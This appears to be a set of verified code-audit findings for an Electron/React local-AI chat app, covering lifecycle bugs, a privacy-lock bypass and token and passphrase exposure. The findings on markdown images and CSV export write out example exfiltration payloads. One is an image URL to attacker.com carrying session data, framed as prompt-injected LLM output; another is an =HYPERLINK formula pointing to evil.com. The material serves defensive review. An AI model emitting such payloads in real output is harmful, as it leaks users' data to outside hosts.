confirmed.title: PrivacyLock auto-unlocks when isEnabled=true but expectedPassphrase is empty string
confirmed.why: The useEffect at line 23-27 calls onUnlock() when `!isEnabled || !expectedPassphrase`. An empty string (`''`) is falsy in JavaScript, so if a user configures privacy lock but leaves the passphrase blank (or clears it), `!expectedPassphrase` is true and onUnlock() is called automatically. The render gate at line 74 has the exact same condition, so the lock overlay also disappears. In App.tsx the isLocked state is set to false (line 375-377) only when `!settings.privacyLockEnabled || !settings.privacyPassphrase`, but the PrivacyLock component is passed `isEnabled={settings.privacyLockEnabled && isLocked}` (line 442). If the App-level guard fails first (blank passphrase), isLocked is set false → PrivacyLock.isEnabled becomes false → overlay hidden with no unlock required. Additionally, the effect in PrivacyLock calls onUnlock() unconditionally even when the component is already showing — every time isEnabled changes to false (e.g. settings sync mid-session), it fires onUnlock() without user interaction.
confirmed.repro: 1. Enable privacy lock in settings. 2. Save with an empty passphrase field (or programmatically set privacyPassphrase to ''). 3. Reload or open the app — PrivacyLock renders null and calls onUnlock() immediately without showing the lock screen.
confirmed.fix: Do not call onUnlock() from inside the effect when the lock is not shown; that is a side-effect with no user action. Instead, guard the component purely via the render path: if `!isEnabled || !expectedPassphrase` return null silently and let the parent decide lock state. In App.tsx, enforce that privacyPassphrase must be a non-empty string before activating privacy lock (validate in SettingsArea before saving). The auto-unlock effect should be removed entirely — the lock overlay disappearing is sufficient; calling onUnlock() proactively can cause a re-entrancy issue if onUnlock triggers state that re-enables the lock.
confirmed.verifierReasoning: Confirmed real. The useEffect at lines 23-27 reads `if (!isEnabled || !expectedPassphrase) { onUnlock(); }`. An empty string is falsy, so `!expectedPassphrase` is true when the passphrase is blank. The onUnlock() callback at App.tsx line 444 is `() => setIsLocked(false)`. The App.tsx effect at lines 371-377 also unlocks: `if (settings.privacyLockEnabled && settings.privacyPassphrase)` sets `isLocked=true`, but if `privacyPassphrase` is `''` the else-branch fires `setIsLocked(false)` — so App-level state never locks. Additionally, PrivacyLock.tsx line 74 returns null for the same condition, so the overlay is hidden. The PrivacyLock effect calling `onUnlock()` unconditionally whenever `isEnabled` becomes false is also a real side-effect: every settings sync that temporarily makes `isEnabled=false` (e.g. a settings object arrives before privacyPassphrase is populated) calls `onUnlock()` without user interaction. Both the App-level guard failure and the PrivacyLock effect path are reachable in normal use.

confirmed.title: Auth token leaked in WebSocket URL query string
confirmed.why: The auth token is appended as `?token=<value>` to the WebSocket upgrade URL. Browser DevTools record WS connection URLs (Network tab → WS frames), Electron's main-process stdout logs the upgrade request, and any local HTTP proxy sees it. The `Referer` header on subsequent navigations can also expose query-string tokens. The token should travel out-of-band (first WS text frame immediately after open, or a short-lived one-time-use ticket obtained from a POST endpoint), not in the URL. This is especially relevant because `authToken()` also reads the token from `window.location.search` (api.ts line 8), meaning it was already in the URL — but embedding it again in the WS URL doubles exposure and persists it in browser history.
confirmed.repro: Open the Electron renderer DevTools → Network tab → filter by WS. The connection URL `ws://localhost:<port>/ws?token=<secret>` is plainly visible. On non-Electron targets the URL also appears in `window.location.href` history.
confirmed.fix: Remove `?token=` from the WS URL. Instead, immediately after `ws.onopen` fires, send the token in the first text frame: `ws.send(JSON.stringify({ type: 'auth', token }))` and have the server reject any further messages until it receives a valid auth frame. Browser WebSocket does not support custom headers on the upgrade, so a first-message protocol is the correct mitigation.
confirmed.verifierReasoning: Confirmed at line 60: the token is appended as a URL query parameter on every connection. The code comment at line 57 even labels this 'audit HIGH #1', acknowledging the concern internally. The token is visible in DevTools Network WS tab and stored in browser history. api.ts correctly uses the X-Auth-Token header for HTTP fetches (line 19), but no equivalent out-of-band mechanism exists for the WS upgrade path.

confirmed.title: privacyPassphrase stored in plaintext localStorage and broadcast in every settings_update WS message
confirmed.why: The `AppSettings` interface includes `privacyPassphrase: string` (line 21). `updateSettings` serialises the entire settings object — passphrase included — to `localStorage` (line 282) and sends it as `{ type: 'settings_update', ...newSettings }` over the WebSocket (line 284). The same spread happens on reconnect (line 83, using `settingsRef.current`) and on `resetSettings` (line 293). Any code that can read localStorage (same origin, any renderer) or observe WS frames retrieves the passphrase in cleartext. Even after the user changes the passphrase the old value remains in `localStorage` until overwritten.
confirmed.repro: Set a privacy passphrase in the UI. Open DevTools Console and run `localStorage.getItem('quenderin_settings')` — the passphrase appears in plain JSON. Simultaneously open the WS inspector: every `settings_update` frame contains `"privacyPassphrase":"<secret>"`.
confirmed.fix: Exclude `privacyPassphrase` from localStorage persistence and from `settings_update` WS messages. Either (a) split it into a separate `sensitiveSettings` object that is kept only in memory, or (b) hash/derive a key from the passphrase client-side and never store or transmit the raw passphrase. Concretely: when building the WS payload, omit the field: `const { privacyPassphrase: _, ...safeSettings } = settingsRef.current; ws.send(JSON.stringify({ type: 'settings_update', ...safeSettings }));`
confirmed.verifierReasoning: Confirmed across multiple lines. AppSettings (line 21) includes privacyPassphrase: string. updateSettings at line 282 calls localStorage.setItem('quenderin_settings', JSON.stringify(newSettings)) with the full object. Line 284 sends it over WS as a spread. Line 83 re-sends it on every reconnect via settingsRef.current. resetSettings (lines 291, 293) repeats both patterns. The passphrase is plaintext in localStorage and in every settings_update WS frame.

confirmed.title: react-markdown renders LLM-supplied images without src scheme validation — data: exfiltration and javascript: src
confirmed.why: No custom 'img' component override exists in any ReactMarkdown call. The default renderer emits verbatim. An attacker-controlled LLM response can include ![x](https://attacker.com/beacon?session=...) to perform a side-channel request (exfiltrating session data via query string / referrer), or ![x](data:text/html,...) on older Chromium builds. Even without script execution, the unconditional outbound request breaks the 'fully offline / private' guarantee advertised in the UI and can leak the user's IP and inference context to an external server.
confirmed.repro: LLM emits: ![x](https://attacker.com/log?data=sensitive). The browser fetches the URL on render with no user interaction.
confirmed.fix: Add a custom 'img' component: function SafeImage({src, alt}) { if (!src?.startsWith('https://') && !src?.startsWith('http://')) return null; return ; }. Also consider whether images should be allowed at all given the offline/private threat model — blocking them entirely is the safest default.
confirmed.verifierReasoning: Partially real, but narrower than claimed. Confirmed via html-url-attributes/lib/index.js line 20-30: img[src] IS included in urlAttributes and goes through defaultUrlTransform. Therefore javascript: and data: URIs are blocked for img src as well — that part of the finding is false. HOWEVER, https:// IS in safeProtocol, so a markdown image like ![x](https://attacker.com/beacon?data=sensitive) renders an unconditional outbound HTTP request with no user interaction. GeneralChatArea.tsx line 281 has no custom img component, so the default renderer emits verbatim for any https/http URL. This contradicts the 'Fully offline / Private / Local AI' guarantee shown in the UI (GeneralChatArea.tsx line 447) and leaks the user's IP and inference context to an external server on render. Severity is medium (privacy/data-leak, not script execution), not high as claimed.

confirmed.title: GeneralChatArea: queue-drain setTimeout not cancelled on unmount — post-unmount onSend call
confirmed.why: The useEffect at line 171 fires a 300 ms setTimeout (line 174) but the effect cleanup function does not call clearTimeout. If the component unmounts while the timer is pending (e.g., the user closes the chat tab), the callback fires: setMessageQueue([]), setIsQueuing(false), onSend(combined, []), and setLastSentPayload(...) are all called on a dead component. The onSend call is the most dangerous consequence — it triggers a new backend inference run with stale queued messages after the UI is gone, wasting resources and potentially producing output that will never be displayed.
confirmed.repro: Queue a message while the agent is running, then immediately close/navigate the chat before 300 ms elapses. The onSend() call fires anyway.
confirmed.fix: Capture the timer id and cancel it in cleanup: useEffect(() => { if (status !== 'running' && messageQueue.length > 0 && !isQueuing) { setIsQueuing(true); const id = setTimeout(() => { ... }, 300); return () => clearTimeout(id); } }, [status, messageQueue, isQueuing, onSend]);
confirmed.verifierReasoning: Confirmed at GeneralChatArea.tsx lines 171-182. The useEffect sets up a 300ms setTimeout at line 174 but the effect's return value is implicitly undefined — there is no clearTimeout call in the cleanup. If status transitions from 'running' to idle while messageQueue is non-empty and the component unmounts within 300ms (e.g., user closes the chat tab or navigates away), the callback fires calling onSend(combined, []) on a dead component. onSend triggers a backend inference call (connecting to the local LLM server), wastes compute, and produces output that is never displayed. The setMessageQueue/setIsQueuing/setLastSentPayload state calls on the unmounted component are no-ops in React 18 but onSend's side effect is real. Severity is medium: the bug is clearly reachable and causes a real observable misbehavior (spurious inference run).

confirmed.title: Missing ws.onerror handler causes silent reconnect storm on auth/upgrade rejection
confirmed.why: The `connect()` function assigns `ws.onopen`, `ws.onmessage`, and `ws.onclose` but never assigns `ws.onerror`. When the server refuses the WebSocket upgrade (e.g. 401 for a bad token, or ECONNREFUSED at startup), the browser fires `onerror` then `onclose`. Because `onerror` is unhandled, the user sees no error, and `onclose` immediately triggers the exponential-backoff reconnect loop (up to 15 attempts). The actual failure reason — e.g. 'invalid token' or 'server not ready' — is never surfaced. With BASE_DELAY_MS=1000 and attempt 1, the first retry fires after ~1-1.3 s; all 15 retries complete in ~55 s, hammering the local server. If the server keeps accepting then immediately dropping (e.g. during model load), `reconnectAttempts` resets to 0 on each successful `onopen` (line 66), so the storm is unbounded.
confirmed.repro: Start the renderer before the Electron backend is ready, or with an invalid token. DevTools Network shows repeated WS connection attempts with no user-visible error explaining the cause. With a token that is accepted then immediately dropped, the counter resets and retries run indefinitely.
confirmed.fix: Add `ws.onerror = (ev) => { console.error('WS error', ev); };` at minimum to surface the error. More importantly, distinguish between 'server rejected upgrade' (do not reconnect, show user a clear error) and 'connection dropped mid-session' (reconnect with backoff). Consider not resetting `reconnectAttempts` to 0 in `onopen` until the connection has been stable for a minimum duration (e.g. 5 s), to avoid the indefinite-storm scenario.
confirmed.verifierReasoning: Confirmed: the connect() function (lines 55-196) assigns ws.onopen, ws.onmessage, and ws.onclose but no ws.onerror. When the server rejects the upgrade, the browser fires onerror then onclose. Because onerror is unhandled the failure reason is never surfaced to the user. onclose triggers the exponential-backoff loop (up to 15 attempts). Critically, line 66 resets reconnectAttempts=0 on every successful onopen, so a server that accepts then immediately drops (opens+closes each time) creates an unbounded retry loop. All of this is verifiable from the code alone without needing runtime observation.

confirmed.title: WelcomeWizard: setInterval in handleDownloadVoice leaks if component unmounts during download
confirmed.why: handleDownloadVoice (line 43-62) creates a `setInterval` at line 48 that fires every 500 ms, advancing `voiceDownloadProgress`. The interval is cleared at line 55 on success. However, if the component unmounts before the fetch resolves (e.g. user navigates away or closes the wizard), the catch block runs `setIsVoiceDownloading(false)` and `setVoiceDownloadProgress(0)` on an unmounted component, and the interval is never cleared in the error path — it will keep firing, calling setState on the unmounted component indefinitely. React 18 silences the warning in development but does not prevent the interval from running, consuming CPU and preventing GC of the closure.
confirmed.repro: 1. Open wizard step 3. 2. Click 'Download Voice Engine'. 3. Immediately dismiss the wizard via any external path that calls onDismiss (e.g. the onboarding state flips because fetchHealth returns isBrainInstalled=true). 4. The interval created at line 48 keeps firing every 500 ms with no component to update.
confirmed.fix: Store the interval id in a ref or local variable accessible in the catch block and clear it there. Better: move the fetch + interval into a useEffect with a cleanup function, or use AbortController for the fetch combined with a ref-tracked interval ID cleared in both catch and finally.
confirmed.verifierReasoning: Confirmed real. In handleDownloadVoice (lines 43-62), the interval is created at line 48 and stored only in the local block scope as the implicit return value of setInterval. In the success path (line 55), `clearInterval(interval)` is called correctly. In the catch path (lines 58-61), the interval variable is out of scope — it is declared inside the try block with `const interval = setInterval(...)` at line 48, and the catch block cannot reference it. The interval is never cleared on error or unmount. If the component unmounts while the fetch is in-flight (e.g. `dismissOnboarding` fires from a concurrent health-check at App.tsx line 274-276 which sets `setShowOnboarding(false)`), the interval keeps firing every 500ms calling `setVoiceDownloadProgress` on the unmounted component indefinitely. The concurrent unmount path via the health-check effect is reachable in normal use.

confirmed.title: AppContent: privacy lock resets to locked on every settings sync, even while user is actively using the app
confirmed.why: The effect at lines 371-377 unconditionally sets `isLocked = true` whenever `settings.privacyLockEnabled && settings.privacyPassphrase` are truthy. `settings` is returned by `useAgentSocket()` and is refreshed any time the WebSocket delivers a settings sync message. So if the backend pushes a settings update while the user is already authenticated (isLocked=false), the effect immediately re-locks the UI mid-session with no user action. This is a correctness bug — the lock state should only be initialized to true, not reset by settings changes after the user has unlocked.
confirmed.repro: 1. Enable privacy lock, unlock the app. 2. A background WebSocket settings-sync message arrives from the server (or the WS reconnects and replays settings). 3. The effect sees privacyLockEnabled=true + non-empty passphrase → setIsLocked(true) → PrivacyLock overlay appears again, interrupting the user.
confirmed.fix: Use a ref to track whether this is the first render (initial mount) and only apply setIsLocked(true) on mount, not on subsequent settings updates. Alternatively, only setIsLocked(true) if the current isLocked state is false AND it is the initial settings load (distinguish via a `settingsInitialized` ref).
confirmed.verifierReasoning: Confirmed real. The effect at App.tsx lines 371-377 has `[settings.privacyLockEnabled, settings.privacyPassphrase]` as deps and unconditionally calls `setIsLocked(true)` whenever both are truthy. The `settings` object comes from `useAgentSocket()` (line 330), which returns settings delivered over a WebSocket. Any settings-sync message from the server causes the settings object to be replaced, which changes the reference, re-runs the effect, and calls `setIsLocked(true)` — even if the user already unlocked (isLocked=false). The PrivacyLock overlay at line 441-445 uses `isEnabled={settings.privacyLockEnabled && isLocked}`, so re-locking via this effect immediately shows the overlay mid-session. This is a real correctness bug reachable whenever the WebSocket reconnects or the server pushes a settings update.

confirmed.title: setState-after-unmount via untracked setTimeout in model download/delete handlers
confirmed.why: handleDownloadModel (line 161) and handleDeleteModel (line 174) both call setTimeout(refreshCatalog, 2000/500) inside a finally block. refreshCatalog is an inner closure that calls fetch('/api/models/catalog').then(d => setModelCatalog(...)). The timeout ID is never stored, so if the component unmounts before the timer fires (e.g., user navigates back quickly after clicking Download or Delete), the network request still completes and setModelCatalog fires on the unmounted component. In React 18 this no longer throws, but the state update is silently discarded — and more importantly the dangling fetch is still in flight and cannot be aborted. If the component has remounted by the time the fetch resolves, it may update stale state. In React strict-mode dev this appears as a spurious extra render.
confirmed.repro: 1. Click 'Download' on any model. 2. Immediately click the back arrow before 2 seconds elapse. 3. In dev tools Network tab, observe the /api/models/catalog GET still fires ~2s later. React DevTools will show an attempted setState on an unmounted SettingsArea.
confirmed.fix: Store the timeout IDs and cancel them via useEffect cleanup: add a ref for each (or a Set of pending IDs), return a cleanup function from a useEffect that tracks the IDs, and call clearTimeout on each stored ID. Better yet, use an AbortController for the refreshCatalog fetch as well so the inflight request is also cancelled.
confirmed.verifierReasoning: Confirmed at lines 161 and 174: both `handleDownloadModel` and `handleDeleteModel` call `setTimeout(refreshCatalog, 2000)` and `setTimeout(refreshCatalog, 500)` respectively with no stored IDs and no cleanup. `refreshCatalog` (lines 143-148) issues a `fetch('/api/models/catalog').then(d => setModelCatalog(...))` — an unabortable inflight request. Navigate away before the timer fires and the fetch still completes, calling `setModelCatalog` on the unmounted instance. React 18 silently discards the update, but the network request is genuinely uncleanable and the state clobber on a fast remount is real. Severity downgraded from high to medium: in React 18 there is no error/crash, the consequence is a stale catalog update or spurious re-render rather than data corruption.

confirmed.title: CSV formula injection via LLM-controlled goal_text in exported metrics
confirmed.why: exportMetricsCsv escapes embedded double-quotes (" → "") but does NOT neutralise CSV formula-injection prefixes. goal_text is LLM or agent output — untrusted per the stated threat model. A malicious or prompt-injected goal such as '=HYPERLINK("http://evil.com","click here")' or '@SUM(1+1)*cmd|' would survive the escaping unchanged. When a user opens the exported .csv in Microsoft Excel or LibreOffice Calc, the cell content is interpreted as a formula, enabling classic CSV injection (SSRF-equivalent data exfiltration via DDE/formula evaluation, or social-engineering via clickable hyperlinks).
confirmed.repro: 1. Cause the agent to log a goal whose text starts with '=HYPERLINK("https://evil.example/","report")'. 2. In the Metrics view, click 'Export CSV'. 3. Open the downloaded file in Excel. The Goal cell renders as a clickable hyperlink.
confirmed.fix: In the exportMetricsCsv row-builder, prefix any cell value that starts with =, +, -, @, \t, or \r with a single-quote (the RFC 4180 / spreadsheet-safe escape): const safeGoal = /^[=+\-@\t\r]/.test(m.goal_text) ? `'${m.goal_text.replace(/"/g, '""')}` : m.goal_text.replace(/"/g, '""'). Also strip or escape embedded newlines (\n, \r) inside the quoted value, as they break CSV row boundaries.
confirmed.verifierReasoning: Confirmed at line 101: `m.goal_text.replace(/"/g, '""')` only escapes embedded double-quotes; it applies no prefix sanitization for formula-injection characters (`=`, `+`, `-`, `@`). `goal_text` is LLM-generated and therefore untrusted. A goal string starting with `=HYPERLINK("https://evil.example/","click")` passes through unchanged into the quoted CSV cell. When the exported file is opened in Excel or LibreOffice Calc, the cell is evaluated as a formula. This is a textbook CSV injection path — LLM output → CSV export → spreadsheet formula evaluation. Severity medium is correct: exploitation requires the user to open the CSV in a formula-evaluating spreadsheet app, which is the primary use-case for a CSV export.

confirmed.title: CodeBlock: setTimeout without cleanup — setCopied fires after unmount
confirmed.why: handleCopy schedules setTimeout(() => setCopied(false), 2000) with no ref to cancel it. If the user navigates away or the component unmounts while the timer is pending (which is likely during fast LLM streaming where CodeBlocks are frequently added/removed), React calls setCopied on an unmounted component. In React 18 strict mode this is a no-op warning; in concurrent mode with transitions it can cause a state update to land on the wrong component instance. It also keeps the component's closure alive for 2 s unnecessarily.
confirmed.repro: Click Copy on a code block, then quickly navigate away. The React 'Can't perform a state update on an unmounted component' warning appears (React 17) or a spurious re-render occurs (React 18).
confirmed.fix: Use useEffect with a cleanup: const timerRef = useRef<ReturnType<typeof setTimeout>>(); const handleCopy = () => { navigator.clipboard.writeText(...); setCopied(true); timerRef.current = setTimeout(() => setCopied(false), 2000); }; useEffect(() => () => clearTimeout(timerRef.current), []);
confirmed.verifierReasoning: Confirmed at CodeBlock.tsx line 12: setTimeout(() => setCopied(false), 2000) has no useEffect cleanup and no timer reference. If the user clicks Copy then quickly navigates away or the streaming response replaces the code block within 2 seconds, the callback fires on an unmounted component. In React 18 this is a no-op (the warning was removed), but the closure holds the component's state setter alive for 2 seconds unnecessarily and can produce a spurious state update in concurrent mode transitions. The fix (useRef + useEffect cleanup) is trivial. Severity is low — no crash, no data corruption — but it is a real and reachable missing-cleanup bug.

confirmed.title: GeneralChatArea: auto-scroll RAF not cancelled in effect cleanup — rAF fires after unmount or stale scroll
confirmed.why: The auto-scroll useEffect (line 107) calls cancelAnimationFrame(rafIdRef.current) at the TOP of the effect body — i.e., it cancels the PREVIOUS frame when the next render triggers the effect. But the effect returns no cleanup function, so when the component unmounts the last scheduled RAF is never cancelled and fires anyway, attempting to call container.scrollTop = container.scrollHeight on a detached DOM node. The pattern also means there is a one-render window where two RAFs are simultaneously alive (the current one has been scheduled but the next effect run hasn't cancelled it yet).
confirmed.repro: Component unmounts while status === 'running' (e.g., user closes the window mid-stream). The rAF callback fires and accesses a detached scrollContainerRef.
confirmed.fix: Return a proper cleanup: useEffect(() => { cancelAnimationFrame(rafIdRef.current); if (!shouldAutoScrollRef.current) return; const container = scrollContainerRef.current; if (!container) return; const id = requestAnimationFrame(() => { ... }); rafIdRef.current = id; return () => cancelAnimationFrame(id); }, [lastLogKey, status]);
confirmed.verifierReasoning: Confirmed at GeneralChatArea.tsx lines 107-121. The effect calls cancelAnimationFrame(rafIdRef.current) at the TOP of the body (line 108, cancelling the previous render's RAF), schedules a new one (line 113), but returns no cleanup function. On unmount, the last scheduled RAF fires and reaches container.scrollTop = container.scrollHeight (line 116) or container.scrollTo(...) (line 118) on a now-detached DOM node. In modern browsers, accessing scrollTop on a detached element is a no-op (not a crash), so the practical impact is negligible. However the finding is structurally correct: there is a missing return () => cancelAnimationFrame(rafIdRef.current). Severity is low — the bug is real and reachable but has no observable symptom in current browser engines.

confirmed.title: ChatArea: agentLogs derived array used as useEffect dep — referential instability causes spurious scroll-to-bottom on every render
confirmed.why: agentLogs is computed inline (line 35: logs.filter(...)) and used directly as the dependency of the scroll useEffect (line 41: }, [agentLogs]). Array.filter always returns a new reference, so this dependency is referentially unstable — the effect fires on every render of ChatArea regardless of whether logs actually changed. When the parent re-renders for unrelated state changes (e.g., status flip, goal text change), the scroll fires unnecessarily, jerking the view to the bottom even when the user has scrolled up to read earlier output.
confirmed.repro: While viewing agent logs, type in the goal textarea. Each keystroke triggers a parent re-render → new agentLogs array reference → scroll fires → view jumps to bottom.
confirmed.fix: Depend on a stable derived value instead of the array reference: }, [agentLogs.length, agentLogs.at(-1)?.id]). Or memoize: const agentLogs = useMemo(() => logs.filter(...), [logs]);
confirmed.verifierReasoning: Confirmed at ChatArea.tsx line 35: agentLogs is computed inline via logs.filter(...) (always a new array reference) and used directly as the dependency at line 41 (}, [agentLogs]). Array.filter always returns a new reference, so the scroll effect fires on every render of ChatArea, including renders caused by parent state changes unrelated to the log content. The practical symptom — the view jumping to bottom when the user has scrolled up — is real and reachable during normal use (e.g., any parent re-render while the user is reading agent output). Severity is low: annoying UX regression but no data loss or security issue. The fix is trivial: depend on agentLogs.length and agentLogs.at(-1)?.id, or memoize with useMemo.

confirmed.title: Unvalidated localStorage settings spread verbatim into WebSocket protocol messages — allows property injection
confirmed.why: Settings are loaded with `{ ...DEFAULT_SETTINGS, ...JSON.parse(saved) }` (lines 37-39). No schema validation is performed: any extra key in the stored JSON survives the merge. On reconnect, the full `settingsRef.current` object is spread into the WS `settings_update` message: `ws.send(JSON.stringify({ type: 'settings_update', ...settingsRef.current }))` (line 83). An attacker who can write to `localStorage` (another page on the same localhost origin, or a compromised renderer) can inject arbitrary top-level fields into every settings_update frame. Depending on how the server parses this message, injected keys could override server-side settings fields or trigger unintended server behavior.
confirmed.repro: In DevTools Console: `localStorage.setItem('quenderin_settings', JSON.stringify({ contextSize: 2048, memorySafetyEnabled: true, chatLogDedupeMs: 1000, themePreference: 'system', privacyLockEnabled: false, privacyPassphrase: '', adminOverride: true }))`. Reload the page. The next `settings_update` WS frame will contain `"adminOverride":true`.
confirmed.fix: After parsing, strip to the known allow-list before storing or using the settings: `const safe: AppSettings = { contextSize: parsed.contextSize ?? DEFAULT_SETTINGS.contextSize, memorySafetyEnabled: parsed.memorySafetyEnabled ?? DEFAULT_SETTINGS.memorySafetyEnabled, ... }`. Reject or ignore any key not in the `AppSettings` interface. Apply the same stripping before sending over WS.
confirmed.verifierReasoning: Lines 37-39 confirm no schema stripping: the spread preserves any extra key from the parsed JSON. Line 83 sends the entire settingsRef.current object into WS frames. The code pattern is real. However, severity is reduced from medium to low: the threat requires a same-origin attacker able to write localStorage (e.g., another tab on localhost or a compromised renderer), which is itself already a significant compromise. Whether injected keys cause server-side harm depends on server parsing behavior, which is not in scope of these two files. The code smell is real but practical exploitability is constrained.

confirmed.title: setState-after-unmount race in ws.onopen during reconnect
confirmed.why: The effect cleanup (lines 201-205) sets `intentionallyClosed = true`, cancels the pending timer, and calls `wsRef.current?.close()`. However if a reconnect timer fires concurrently with cleanup — i.e. `setTimeout(connect, ...)` fires just before `clearTimeout(reconnectTimer)` executes — `connect()` runs, creates a new WebSocket, and assigns it to `wsRef.current`. The cleanup's subsequent `wsRef.current?.close()` will close the new socket, but if that new socket's `onopen` fires in the narrow window before `.close()` reaches it, `setWsReady(true)` and `reconnectAttempts = 0` execute on an unmounted component. React 18 suppresses the warning but the state update is a no-op on a dead fiber, wasting a render cycle. On older React (<=17) this throws the 'setState on unmounted component' warning. The `onmessage` and `onclose` handlers on the new socket also have no unmount guard beyond `intentionallyClosed` (which is already true), so they call `setLogs`/`setWsReady` on the dead component.
confirmed.repro: Mount the hook, let the WS connect, force-disconnect the server so a reconnect timer is queued, then rapidly unmount the component (e.g. navigate away). With timing, `onopen` from the reconnect socket fires after unmount and triggers state updates.
confirmed.fix: Add a `mounted` flag inside the effect and guard every `setX` call: `let mounted = true; ... ws.onopen = () => { if (!mounted) return; setWsReady(true); ... }; return () => { mounted = false; intentionallyClosed = true; ... };`. Apply the guard to `onopen`, `onclose`, and the `setLogs`/`setStatus` calls inside `onmessage`.
confirmed.verifierReasoning: The race is real but the window is narrow. Cleanup at lines 201-205 sets intentionallyClosed=true, then clears the timer, then closes the socket. If a reconnect timer fires between being dequeued from the JS event loop and clearTimeout executing, connect() runs and creates a new WebSocket. The new socket's onopen at line 64 calls setWsReady(true) with no intentionallyClosed guard (only onclose at line 170 checks that flag). So setWsReady(true) can execute after unmount. In React 18 this is a silent no-op; in React 17 it warns. Severity is low rather than medium because React 18 suppresses it, the state update is a no-op, and the timing window requires the timer to fire at exactly the wrong microsecond during cleanup.

confirmed.title: data.data.progress accessed without optional chaining — throws TypeError silently on malformed server frame
confirmed.why: Line 150 reads `data.data.progress` with no null check. If the server sends a `model_download_progress` frame without a `data` sub-object (e.g. `{"type":"model_download_progress"}`) or with `data: null`, this throws a TypeError. The outer try/catch (line 70/163) silently swallows it, logging only 'Invalid WS message' to the console. The download progress UI then never updates. By contrast, the `action_required` branch at line 135 correctly uses `data.data?.code`, making this inconsistency likely an oversight.
confirmed.repro: Send `{"type":"model_download_progress"}` (no `data` field) from the server. The progress bar stays at 0 and 'Invalid WS message TypeError' appears in the console.
confirmed.fix: Change line 150 to `setDownloadProgress(data.data?.progress ?? 0);` — consistent with the optional chaining already used on `data.elements` (line 93) and `data.data?.code` (line 135).
confirmed.verifierReasoning: Confirmed at line 150: setDownloadProgress(data.data.progress) with no null check on data.data. The adjacent action_required branch at line 135 already uses data.data?.code (optional chaining), making this an inconsistency. A model_download_progress frame without a data sub-object throws TypeError: Cannot read properties of undefined (reading 'progress'), which is caught by the try/catch at lines 69/163 and logged as 'Invalid WS message' while the download progress UI freezes at 0. This is reachable any time the server emits a malformed frame.

confirmed.title: PrivacyLock: stale closure on failedAttempts in handleSubmit — lockout count can regress under concurrent submissions
confirmed.why: handleSubmit is wrapped in useCallback with `[passphrase, expectedPassphrase, onUnlock, failedAttempts, lockoutUntil]` as deps (line 72). This looks correct, but the async nature of the function means that between `await hashPassphrase(passphrase)` (line 54) and `await hashPassphrase(expectedPassphrase)` (line 55), React can re-render and create a new handleSubmit with an updated failedAttempts. The OLD closure that is already executing still holds the stale `failedAttempts` value it captured before the awaits. If the user double-submits (e.g. by pressing Enter twice quickly), both coroutines captured `failedAttempts=N`; both compute `newAttempts = N+1` and set state to `N+1` rather than `N+2`. Lockout is only triggered at `>= 5` so this effectively lets an attacker get 9 attempts instead of 5 by double-clicking.
confirmed.repro: Rapidly submit two wrong passphrases before either SHA-256 hash completes (< 1 ms each, but possible in a busy tab). Both closures read the same `failedAttempts` value and both write `failedAttempts + 1`, so only one attempt is counted.
confirmed.fix: Use a functional state updater `setFailedAttempts(prev => prev + 1)` and read the resulting count via a ref or combine into a single setState call. Better: set a `submitting` ref on entry and clear it on resolution to prevent concurrent submissions.
confirmed.verifierReasoning: Partially real but severity is overstated. The stale-closure mechanism is accurate: handleSubmit is async and captures `failedAttempts` at closure time (line 72 dep array). Between the two `await hashPassphrase(...)` calls at lines 54-55, a re-render can create a new closure, but the in-flight one still uses the old `failedAttempts` value. The race requires two form submissions to resolve concurrently during the hash operations. However, SHA-256 via WebCrypto is extremely fast (sub-millisecond), making the race window tiny and practically unexploitable in normal use — a user would need to press Enter twice faster than a SHA-256 digest completes. The submit button is also disabled while `!passphrase` (line 108). This is a real theoretical race but the practical lockout bypass from 5 to 9 attempts is not realistically reachable under normal conditions. Severity should be low, not medium.

confirmed.title: WelcomeWizard: setTimeout in handleFinish and handleDownloadVoice fire setState after unmount
confirmed.why: handleDownloadVoice calls `setTimeout(() => setIsVoiceDownloading(false), 1000)` at line 57. handleFinish calls `await new Promise(r => setTimeout(r, 500))` at line 67. Neither timeout is tracked or cancelled. If the component unmounts before these fire — e.g. the parent's `showOnboarding` flips to false via the health-check effect concurrently with the user clicking Finish — the resolved callbacks attempt to set state on a now-unmounted component. While React 18 doesn't throw, this is a semantic bug: the state update is a no-op but the closure keeps the component instance alive past its intended lifetime.
confirmed.repro: Start voice download → quickly dismiss onboarding from a concurrent health-check path → after 1s the timeout fires against a stale closure.
confirmed.fix: Track the timeout IDs in refs (or useRef within the component) and cancel them in a useEffect cleanup. For handleFinish the timeout is cosmetic; removing it or replacing with a synchronous call to onDismiss is the cleanest fix.
confirmed.verifierReasoning: Partially real. The setTimeout at line 57 (`setTimeout(() => setIsVoiceDownloading(false), 1000)`) is not tracked and cannot be cancelled. If the component unmounts before 1 second elapses, it fires setState on the unmounted component. The concurrent unmount via health-check (App.tsx lines 274-276 setting `showOnboarding(false)`) is a real path. However, React 18 suppresses the warning and the setState is a no-op — no crash, no corrupted state, no user-visible effect. The handleFinish timeout at line 67 uses `await new Promise(r => setTimeout(r, 500))` purely as a delay before calling `onDismiss()`, which itself causes the unmount — the setTimeout is already resolved before setState-after-unmount can occur here. The main real issue is the line 57 timeout in the success path. Low severity: it is a resource hygiene issue (keeps the closure alive for 1s) but not a crash or data corruption.

confirmed.title: Sidebar: /api/sessions fetch has no cancellation — stale setState on view change
confirmed.why: The useEffect at line 40-47 fires on every `currentView` change and issues a `fetch('/api/sessions')`. There is no AbortController and no mounted-check. If `currentView` changes twice rapidly (e.g. user clicks two nav items), two fetches are in-flight simultaneously. The second may resolve before the first, and when the first finally resolves it overwrites `recentSessions` with stale data. Additionally if the Sidebar unmounts (sidebar closed on mobile) while a fetch is in-flight, the `.then` callback calls `setRecentSessions` on an unmounted component.
confirmed.repro: Click two different nav items in quick succession. The first (slower) fetch response can overwrite the correct state set by the second (faster) fetch, showing the wrong session list.
confirmed.fix: Add an AbortController: `const ac = new AbortController(); fetch('/api/sessions', { signal: ac.signal })...` and return `() => ac.abort()` from the effect. This ensures only the latest fetch result updates state.
confirmed.verifierReasoning: Confirmed real. The useEffect at Sidebar.tsx lines 40-47 issues `fetch('/api/sessions')` with no AbortController and no mounted-check. It re-runs on every `currentView` change. Rapid nav-item clicks (the nav buttons call `setCurrentView` on each click at lines 56-68) will launch multiple concurrent fetches. The `.then` callbacks all resolve in arbitrary order and all call `setRecentSessions`, so the last-to-resolve wins regardless of which request was most recent. Additionally, if the Sidebar unmounts (the mobile overlay dismisses it via `setSidebarOpen(false)` in App.tsx, which collapses the component via CSS but keeps it mounted — so unmount-after-fetch is less likely than stale-update, but the stale-data race is real). The stale-data scenario is fully reachable by clicking two different nav items quickly.

